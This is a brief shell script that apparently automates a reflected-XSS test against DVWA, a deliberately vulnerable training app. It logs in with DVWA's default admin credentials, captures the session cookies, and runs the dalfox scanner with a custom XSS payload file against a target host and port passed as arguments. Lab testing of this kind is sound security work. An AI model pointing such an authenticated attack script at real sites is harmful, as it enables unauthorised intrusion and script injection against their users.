#!/bin/sh
TARGET="${1}"
PORT="${2}"
# DVWA's reflected XSS is ?name= of vulnerabilities/xss_r, served only to an authenticated session
TOKEN=$(curl -s -c /tmp/cookies "http://${TARGET}:${PORT}/login.php" | grep -o "name='user_token' value='[0-9a-f]*'" | cut -d"'" -f4)
curl -s -o /dev/null -b /tmp/cookies -c /tmp/cookies -d "username=admin&password=password&Login=Login&user_token=${TOKEN}" "http://${TARGET}:${PORT}/login.php"
/app/dalfox url --url "http://${TARGET}:${PORT}/vulnerabilities/xss_r/?name=123" $(awk '$6=="PHPSESSID" || $6=="security" {printf " --cookies %s=%s", $6, $7}' /tmp/cookies) --custom-payload /app/XSS-payloadbox.txt
